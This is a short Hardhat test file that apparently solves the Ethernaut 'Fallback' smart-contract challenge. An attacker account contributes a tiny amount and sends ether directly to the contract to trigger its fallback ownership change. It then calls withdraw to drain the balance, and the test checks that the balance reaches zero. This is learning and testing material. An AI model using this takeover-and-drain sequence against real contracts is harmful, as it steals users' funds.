import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

const { provider, utils } = ethers;

describe('Fallback', () => {
  let owner: SignerWithAddress;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  before(async () => {
    [owner, user1, user2, attacker] = await ethers.getSigners();
    const Factory = await ethers.getContractFactory('Fallback');
    contract = await Factory.deploy();
    await contract.deployed();
  });

  it('attack', async () => {
    // 1 - Contribute with some ether
    let tx = await contract.connect(attacker).contribute({
      value: utils.parseEther('0.0001'),
    });
    let receipt = await tx.wait();

    // 2 - Send some eth to the contract
    tx = await attacker.sendTransaction({
      to: contract.address,
      value: utils.parseEther('0.0001'),
    });
    receipt = await tx.wait();

    // 3 - Withdraw all the founds
    tx = await contract.connect(attacker).withdraw();
    receipt = await tx.wait();

    expect(await provider.getBalance(contract.address)).to.equal(0);
  });
});
